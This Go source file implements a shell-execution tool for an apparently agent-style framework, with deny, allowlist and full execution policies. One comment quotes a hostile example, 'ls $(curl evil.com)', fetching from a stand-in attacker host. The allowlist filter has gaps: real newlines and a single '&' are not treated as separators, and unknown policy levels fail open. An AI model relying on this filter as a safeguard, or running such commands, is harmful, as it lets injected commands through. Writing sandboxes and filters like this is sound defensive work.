package tools

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const defaultBashTimeout = 120 * time.Second

// ExecPolicy controls which commands the bash tool is allowed to execute.
type ExecPolicy struct {
	Level     string   // "deny", "allowlist", "full"
	Allowlist []string // command basenames allowed when Level is "allowlist"
}

// BashTool executes shell commands.
type BashTool struct {
	WorkDir    string
	ExecPolicy *ExecPolicy // nil means "full" (allow everything)
}

type bashInput struct {
	Command string `json:"command"`
	Timeout int    `json:"timeout"` // seconds, optional
}

func (t *BashTool) Name() string { return "bash" }

func (t *BashTool) Description() string {
	return "Execute a bash command and return its output. The command runs in a shell with a configurable timeout (default 120 seconds)."
}

func (t *BashTool) Parameters() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"command": {
				"type": "string",
				"description": "The bash command to execute"
			},
			"timeout": {
				"type": "integer",
				"description": "Timeout in seconds (default: 120)"
			}
		},
		"required": ["command"]
	}`)
}

// extractCommands extracts executable names from a bash command string.
// It splits on pipes, semicolons, &&, and || to find each sub-command,
// then takes the first token (the executable) from each.
func extractCommands(cmd string) []string {
	// Split on shell operators
	var parts []string
	remaining := cmd
	for len(remaining) > 0 {
		// Find the earliest operator
		minIdx := len(remaining)
		opLen := 0
		for _, op := range []string{"&&", "||", "|", ";"} {
			if idx := strings.Index(remaining, op); idx != -1 && idx < minIdx {
				minIdx = idx
				opLen = len(op)
			}
		}

		part := strings.TrimSpace(remaining[:minIdx])
		if part != "" {
			parts = append(parts, part)
		}

		if minIdx+opLen >= len(remaining) {
			break
		}
		remaining = remaining[minIdx+opLen:]
	}

	var cmds []string
	for _, part := range parts {
		// Strip leading env vars (e.g., "FOO=bar command")
		tokens := strings.Fields(part)
		for _, tok := range tokens {
			if strings.Contains(tok, "=") && !strings.HasPrefix(tok, "-") {
				continue // skip env var assignments
			}
			cmds = append(cmds, filepath.Base(tok))
			break
		}
	}
	return cmds
}

func (t *BashTool) Execute(ctx context.Context, input json.RawMessage) (ToolResult, error) {
	var in bashInput
	if err := json.Unmarshal(input, &in); err != nil {
		return ToolResult{Error: fmt.Sprintf("invalid input: %v", err)}, nil
	}

	if in.Command == "" {
		return ToolResult{Error: "command is required"}, nil
	}

	// Enforce exec policy
	if t.ExecPolicy != nil {
		switch t.ExecPolicy.Level {
		case "deny":
			return ToolResult{Error: "bash execution is disabled by policy"}, nil
		case "allowlist":
			// Block shell metacharacters that can execute arbitrary code
			// inside an otherwise-allowed command (e.g. ls $(curl evil.com))
			for _, meta := range []string{"$(", "`", "<(", ">(", "${", "\\n"} {
				if strings.Contains(in.Command, meta) {
					return ToolResult{Error: "command contains shell metacharacters not allowed in allowlist mode"}, nil
				}
			}
			cmds := extractCommands(in.Command)
			allowed := make(map[string]bool, len(t.ExecPolicy.Allowlist))
			for _, a := range t.ExecPolicy.Allowlist {
				allowed[a] = true
			}
			for _, cmd := range cmds {
				if !allowed[cmd] {
					return ToolResult{Error: fmt.Sprintf("command %q is not in the exec allowlist", cmd)}, nil
				}
			}
		}
		// "full" or unrecognized: allow everything
	}

	timeout := defaultBashTimeout
	if in.Timeout > 0 {
		timeout = time.Duration(in.Timeout) * time.Second
	}

	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "bash", "-c", in.Command)
	if t.WorkDir != "" {
		cmd.Dir = t.WorkDir
	}

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	output := stdout.String()
	errOutput := stderr.String()

	if err != nil {
		msg := err.Error()
		if ctx.Err() == context.DeadlineExceeded {
			msg = "command timed out"
		}
		if errOutput != "" {
			msg = errOutput
		}
		return ToolResult{
			Output: output,
			Error:  msg,
		}, nil
	}

	if errOutput != "" {
		output += "\nSTDERR:\n" + errOutput
	}

	return ToolResult{Output: output}, nil
}
